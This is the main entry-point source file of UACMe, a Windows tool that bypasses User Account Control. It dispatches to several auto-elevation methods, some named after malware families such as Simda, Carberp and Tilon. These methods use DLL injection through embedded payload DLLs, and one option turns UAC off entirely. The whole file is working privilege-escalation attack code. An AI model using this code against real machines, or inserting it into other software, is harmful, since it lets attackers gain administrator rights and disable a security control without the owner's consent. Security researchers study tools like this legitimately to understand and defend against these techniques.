/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.50
*
*  DATE:        05 Apr 2015
*
*  Injector entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

#ifdef _WIN64
#include "dll64.h"
#define INJECTDLL Fubuki64
#define AVRFDLL	Hibiki64
#else
#include "dll32.h"
#define INJECTDLL Fubuki32
#define AVRFDLL Hibiki32
#endif

#define PROGRAMTITLE TEXT("UACMe")
#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
This is not supported, run x64 version of this tool.")
#define WINPREBLUE TEXT("This method is only for pre Windows 8.1 use")
#define WINBLUEONLY TEXT("This method is only for Windows 8.1 use")
#define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
VOID main()
{
	BOOL					IsWow64 = FALSE;
	DWORD					bytesIO, dwType;
	WCHAR					szBuffer[MAX_PATH + 1];
	TOKEN_ELEVATION_TYPE	ElevType;
	RTL_OSVERSIONINFOW		osver;

	//verify system version
	RtlSecureZeroMemory(&osver, sizeof(osver));
	osver.dwOSVersionInfoSize = sizeof(osver);
	RtlGetVersion(&osver);

	if (osver.dwBuildNumber < 7000) {

		MessageBox(GetDesktopWindow(),
			TEXT("Unsupported version"), PROGRAMTITLE, MB_ICONINFORMATION);

		goto Done;
	}

	ElevType = TokenElevationTypeDefault;
	if (!supGetElevationType(&ElevType)) {
		goto Done;
	}
	if (ElevType != TokenElevationTypeLimited) {
		MessageBox(GetDesktopWindow(), TEXT("Admin account with limited token required."), 
			PROGRAMTITLE, MB_ICONINFORMATION);
		goto Done;
	}


	IsWow64 = supIsProcess32bit(GetCurrentProcess());

	dwType = 0;
	bytesIO = 0;
	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
	if (GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO)) {

		dwType = strtoul(szBuffer);
		switch (dwType) {

		case METHOD_SYSPREP:
			OutputDebugString(TEXT("[UCM] Sysprep\n\r"));
			if (osver.dwBuildNumber > 9200) {
				MessageBox(GetDesktopWindow(), WINPREBLUE,
					PROGRAMTITLE, MB_ICONINFORMATION);
				goto Done;
			}
			break;

		case METHOD_SYSPREP_EX:
			OutputDebugString(TEXT("[UCM] Sysprep_ex\n\r"));
			if (osver.dwBuildNumber < 9600) {
				MessageBox(GetDesktopWindow(), WINBLUEONLY,
					PROGRAMTITLE, MB_ICONINFORMATION);
				goto Done;
			}
			break;

		case METHOD_OOBE:
			OutputDebugString(TEXT("[UCM] Oobe\n\r"));
			break;

		case METHOD_APPCOMPAT:
			OutputDebugString(TEXT("[UCM] AppCompat\n\r"));

#ifdef _WIN64
			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY, 
				PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
#endif
			break;

		case METHOD_SIMDA:
			OutputDebugString(TEXT("[UCM] Simda\n\r"));
			break;

		case METHOD_CARBERP:
			OutputDebugString(TEXT("[UCM] Carberp\n\r"));
			break;

		case METHOD_CARBERP_EX:
			OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
			break;

		case METHOD_TILON:
			OutputDebugString(TEXT("[UCM] Tilon\n\r"));
			if (osver.dwBuildNumber > 9200) {
				MessageBox(GetDesktopWindow(), WINPREBLUE,
					PROGRAMTITLE, MB_ICONINFORMATION);
				goto Done;
			}
			break;

		case METHOD_AVRF:
			OutputDebugString(TEXT("[UCM] AVrf\n\r"));
			break;
		}
	}


	switch (dwType) {

	case METHOD_SYSPREP:
	case METHOD_SYSPREP_EX:
	case METHOD_OOBE:
	case METHOD_TILON:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}
#endif
		if (ucmStandardAutoElevation(dwType, INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
		}
		break;

//
//  There is no RedirectEXE for x64.
//
#ifndef _WIN64
	case METHOD_APPCOMPAT:
		if (ucmAppcompatElevation()) {
			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
		}
		break;
#endif
	case METHOD_SIMDA:

		//
		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
		//
#ifndef _DEBUG
		if (IsWow64) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}
#endif
		if (MessageBox(GetDesktopWindow(),
			TEXT("This method will TURN UAC OFF, are you sure? You will need to reenable it after manually."),
			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
		{
			if (ucmSimdaTurnOffUac()) {
				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
			}
		}
		break;

	case METHOD_CARBERP:
	case METHOD_CARBERP_EX:

		if (dwType == METHOD_CARBERP) {

			if (osver.dwBuildNumber > 9600) {
				MessageBoxW(GetDesktopWindow(),
					TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
				goto Done;
			}

			//there is no migmiz in syswow64 in 8+
			if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
				MessageBoxW(GetDesktopWindow(),
					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
				goto Done;
			}
		}

		if (ucmWusaMethod(dwType, INJECTDLL, sizeof(INJECTDLL))) {
			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
		}
		break;

	case METHOD_AVRF:
#ifndef _DEBUG
		if (IsWow64) {
			MessageBoxW(GetDesktopWindow(),
				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
			goto Done;
		}
#endif
		if (ucmAvrfMethod(AVRFDLL, sizeof(AVRFDLL))) {
			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
		}	
		break;

	}

Done:
	ExitProcess(0);
}
